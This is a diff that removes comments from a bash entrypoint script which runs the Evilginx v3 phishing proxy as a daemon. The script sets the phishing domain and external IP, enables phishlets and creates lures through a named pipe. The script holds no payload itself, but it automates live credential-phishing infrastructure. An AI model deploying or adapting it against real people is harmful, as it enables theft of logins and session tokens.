@@ -1,7 +1,6 @@
 #!/bin/bash
 # evilginx-entrypoint.sh - Production entrypoint for Evilginx v3
 # Runs Evilginx v3 as a daemon by piping commands to stdin.
-# This is called by supervisor for the evilginx process only.
 
 set -euo pipefail
 
@@ -74,17 +73,14 @@ echo "External IP: ${EVILGINX_EXTERNAL_IPV4:-<not set>}"
 # Build commands to send to Evilginx stdin
 COMMANDS=""
 
-# Set domain if provided
 if [ -n "${EVILGINX_DOMAIN:-}" ]; then
     COMMANDS="${COMMANDS}config domain ${EVILGINX_DOMAIN}\n"
 fi
 
-# Set external IP if provided
 if [ -n "${EVILGINX_EXTERNAL_IPV4:-}" ]; then
     COMMANDS="${COMMANDS}config ipv4 external ${EVILGINX_EXTERNAL_IPV4}\n"
 fi
 
-# Enable each phishlet with hostname
 if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
     IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
     for phishlet in "${PHISHLETS[@]}"; do
@@ -96,7 +92,6 @@ if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
     done
 fi
 
-# Create a basic lure for each enabled phishlet
 if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
     IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
     for phishlet in "${PHISHLETS[@]}"; do
@@ -112,33 +107,25 @@ echo "Config: ${CONFIG_DIR}/config.json"
 echo "Domain: ${EVILGINX_DOMAIN:-<not set>}"
 echo "External IP: ${EVILGINX_EXTERNAL_IPV4:-<not set>}"
 
-# Use a named pipe for stdin
 PIPE="/tmp/evilginx_stdin"
 rm -f "$PIPE"
 mkfifo "$PIPE"
 
-# Start Evilginx with stdin from the pipe
 cat "$PIPE" | "${EVILGINX_BIN}" "${CMD_ARGS[@]}" >> "${LOG_FILE}" 2>&1 &
 EVILGINX_PID=$!
 
-# Save PID for healthcheck
 echo "${EVILGINX_PID}" > /tmp/evilginx.pid
-
 echo "Evilginx started with PID: ${EVILGINX_PID}"
 
-# Send initial configuration commands through the pipe
 (
-    # Set domain if provided
     if [ -n "${EVILGINX_DOMAIN:-}" ]; then
         echo -e "config domain ${EVILGINX_DOMAIN}"
     fi
 
-    # Set external IP if provided
     if [ -n "${EVILGINX_EXTERNAL_IPV4:-}" ]; then
         echo -e "config ipv4 external ${EVILGINX_EXTERNAL_IPV4}"
     fi
 
-    # Enable each phishlet with hostname
     if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
         IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
         for phishlet in "${PHISHLETS[@]}"; do
@@ -150,7 +137,6 @@ echo "Evilginx started with PID: ${EVILGINX_PID}"
         done
     fi
 
-    # Create a basic lure for each enabled phishlet
     if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
         IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
         for phishlet in "${PHISHLETS[@]}"; do
@@ -161,7 +147,6 @@ echo "Evilginx started with PID: ${EVILGINX_PID}"
         done
     fi
 
-    # Keep Evilginx alive by sending newline every 30 seconds
     while true; do
         sleep 30
         echo ""
@@ -170,11 +155,8 @@ echo "Evilginx started with PID: ${EVILGINX_PID}"
 COMMAND_PID=$!
 
 echo "Evilginx started with PID: ${EVILGINX_PID}"
-
-# Wait for initialization
 sleep 5
 
-# Check if process is alive
 if ! kill -0 "${EVILGINX_PID}" 2>/dev/null; then
     echo "ERROR: Evilginx died during startup"
     cat "${LOG_FILE}"
@@ -182,15 +164,11 @@ if ! kill -0 "${EVILGINX_PID}" 2>/dev/null; then
 fi
 
 echo "Evilginx running. Tailing logs..."
-
-# Tail logs to keep process alive (supervisor expects process to stay running)
 tail -f "${LOG_FILE}" &
 TAIL_PID=$!
 
-# Handle signals
 trap 'echo "Shutting down..."; kill "${EVILGINX_PID}" 2>/dev/null; kill "${COMMAND_PID}" 2>/dev/null; kill "${TAIL_PID}" 2>/dev/null; rm -f "$PIPE"; exit 0' SIGTERM SIGINT
 
-# Wait for evilginx process
 wait "${EVILGINX_PID}"
 EVILGINX_EXIT=$?
 
